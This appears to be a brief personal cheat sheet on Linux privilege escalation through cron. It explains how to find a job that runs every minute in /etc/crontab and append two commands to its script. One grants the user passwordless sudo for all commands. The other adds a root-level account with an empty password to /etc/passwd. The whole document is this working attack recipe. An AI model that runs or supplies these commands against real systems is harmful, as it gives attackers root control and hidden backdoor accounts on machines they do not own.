# PRIV ESC via crontab

After that we can locate the crontab file (etc/crontab) read it and find a process which is executed every minutes (or hours...).
~whoami => current user, copy it

edit the executable => add+

    echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
    echo "user::0:0:System Administrator:/root/root:/bin/bash" >> /etc/passwd

we can now execute commands with 'sudo' 
